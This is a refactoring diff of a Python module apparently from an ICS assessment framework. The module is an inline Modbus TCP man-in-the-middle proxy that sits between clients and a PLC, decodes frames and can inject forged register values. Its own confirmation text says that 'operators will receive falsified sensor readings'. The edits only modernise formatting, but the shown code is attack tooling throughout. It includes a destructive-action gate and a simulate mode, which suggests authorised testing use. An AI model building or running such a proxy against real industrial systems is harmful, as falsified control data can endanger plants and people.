@@ -67,7 +67,7 @@ _FC_NAMES: dict[int, str] = {
 _stop_event: threading.Event = threading.Event()
 
 
-def _decode_modbus_mbap(data: bytes) -> Optional[tuple[int, int, int, int]]:
+def _decode_modbus_mbap(data: bytes) -> tuple[int, int, int, int] | None:
     """Parse Modbus TCP MBAP header. Returns (transaction_id, protocol_id, length, unit_id)."""
     if len(data) < 7:
         return None
@@ -80,16 +80,16 @@ def _describe_modbus_pdu(pdu: bytes) -> str:
     if not pdu:
         return "empty PDU"
     fc = pdu[0]
-    fc_name = _FC_NAMES.get(fc, "FC{:02X}".format(fc))
+    fc_name = _FC_NAMES.get(fc, f"FC{fc:02X}")
 
     if fc in (0x03, 0x04) and len(pdu) >= 5:
         start = struct.unpack(">H", pdu[1:3])[0]
         count = struct.unpack(">H", pdu[3:5])[0]
-        return "{} start={} count={}".format(fc_name, start, count)
+        return f"{fc_name} start={start} count={count}"
     if fc in (0x05, 0x06) and len(pdu) >= 5:
         addr = struct.unpack(">H", pdu[1:3])[0]
         val = struct.unpack(">H", pdu[3:5])[0]
-        return "{} addr={} value=0x{:04X}".format(fc_name, addr, val)
+        return f"{fc_name} addr={addr} value=0x{val:04X}"
     if fc == 0x10 and len(pdu) >= 6:
         start = struct.unpack(">H", pdu[1:3])[0]
         count = struct.unpack(">H", pdu[3:5])[0]
@@ -98,13 +98,13 @@ def _describe_modbus_pdu(pdu: bytes) -> str:
         )
     if fc >= 0x80:
         exc = pdu[1] if len(pdu) > 1 else "?"
-        return "Exception FC{:02X} code={}".format(fc & 0x7F, exc)
-    return "{} pdu_hex={}".format(fc_name, pdu.hex())
+        return f"Exception FC{fc & 0x7F:02X} code={exc}"
+    return f"{fc_name} pdu_hex={pdu.hex()}"
 
 
 def _log_frame(direction: str, data: bytes) -> None:
     """Log a Modbus TCP frame with decoded info."""
-    ts = datetime.datetime.now(datetime.timezone.utc).isoformat()
+    ts = datetime.datetime.now(datetime.UTC).isoformat()
     mbap = _decode_modbus_mbap(data)
     if mbap and len(data) >= 7:
         tid, pid, length, uid = mbap
@@ -157,9 +157,7 @@ def _maybe_inject_value(
     pdu_modified = bytearray(pdu)
     struct.pack_into(">H", pdu_modified, offset, inject_value & 0xFFFF)
     print_warning(
-        "[MITM-PROXY] INJECTED FC{:02X} register[{}] = 0x{:04X}".format(
-            inject_fc, inject_register, inject_value
-        )
+        f"[MITM-PROXY] INJECTED FC{inject_fc:02X} register[{inject_register}] = 0x{inject_value:04X}"
     )
     return data[:7] + bytes(pdu_modified)
 
@@ -179,7 +177,7 @@ def _proxy_connection(
     try:
         plc_conn = socket.create_connection((plc_host, plc_port), timeout=10)
     except OSError as exc:
-        print_error("[MITM-PROXY] Cannot connect to PLC {}:{}: {}".format(plc_host, plc_port, exc))
+        print_error(f"[MITM-PROXY] Cannot connect to PLC {plc_host}:{plc_port}: {exc}")
         client_conn.close()
         return
 
@@ -281,9 +279,7 @@ class Exploit(_Exploit):
 
         if self.simulate:
             inj_desc = (
-                "Value injection ENABLED: FC{:02X} register[{}] = 0x{:04X}".format(
-                    int(self.inject_fc), int(self.inject_register), int(self.inject_value)
-                )
+                f"Value injection ENABLED: FC{int(self.inject_fc):02X} register[{int(self.inject_register)}] = 0x{int(self.inject_value):04X}"
                 if self.inject_enabled
                 else "Value injection DISABLED (passive logging only)"
             )
@@ -312,24 +308,18 @@ class Exploit(_Exploit):
         if self.inject_enabled and self.destructive:
             if not DestructiveGate.require_confirmation(
                 module_name="assessment/lateral/modbus_mitm_inline",
-                target="{}:{}".format(self.target, self.port),
+                target=f"{self.target}:{self.port}",
                 impact_level="HIGH",
                 description=(
                     "Inline Modbus MiTM proxy WITH value injection: "
-                    "FC{:02X} register[{}] = 0x{:04X} - "
-                    "operators will receive falsified sensor readings".format(
-                        int(self.inject_fc),
-                        int(self.inject_register),
-                        int(self.inject_value),
-                    )
+                    f"FC{int(self.inject_fc):02X} register[{int(self.inject_register)}] = 0x{int(self.inject_value):04X} - "
+                    "operators will receive falsified sensor readings"
                 ),
             ):
                 return
 
         print_status(
-            "[MITM-PROXY] Starting proxy on {}:{} -> {}:{}".format(
-                self.listen_host, self.listen_port, self.target, self.port
-            )
+            f"[MITM-PROXY] Starting proxy on {self.listen_host}:{self.listen_port} -> {self.target}:{self.port}"
         )
 
         try:
@@ -338,13 +328,11 @@ class Exploit(_Exploit):
             server.bind((str(self.listen_host), int(self.listen_port)))
             server.listen(int(self.max_clients))
         except OSError as exc:
-            print_error("[MITM-PROXY] Bind failed: {}".format(exc))
+            print_error(f"[MITM-PROXY] Bind failed: {exc}")
             return
 
         print_success(
-            "[MITM-PROXY] Listening on {}:{}. Press Ctrl+C to stop.".format(
-                self.listen_host, self.listen_port
-            )
+            f"[MITM-PROXY] Listening on {self.listen_host}:{self.listen_port}. Press Ctrl+C to stop."
         )
         _stop_event.clear()
         server.settimeout(1.0)
@@ -353,7 +341,7 @@ class Exploit(_Exploit):
             while not _stop_event.is_set():
                 try:
                     client_conn, client_addr = server.accept()
-                except socket.timeout:
+                except TimeoutError:
                     continue
                 t = threading.Thread(
                     target=_proxy_connection,
